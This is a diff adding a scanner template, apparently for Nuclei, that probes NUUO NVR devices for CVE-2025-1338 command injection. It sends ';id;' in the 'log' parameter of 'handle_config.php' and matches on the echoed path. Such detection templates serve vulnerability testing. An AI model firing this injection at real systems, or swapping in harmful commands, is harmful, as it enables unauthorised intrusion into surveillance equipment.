@@ -1,0 +1,21 @@
+id: nuuo-nvr-handle_config-rce
+
+info:
+  name: CVE-2025-1338
+  author: HuanXiong
+  severity: critical
+
+  tags: RCE
+
+http:
+  - raw:
+      - |
+        GET /handle_config.php?log=;id; HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
+
+    matchers:
+      - type: dsl
+        name: RCE
+        dsl:
+          - "status_code == 200 && contains(body, '/mtd/block4/log/;id;')"
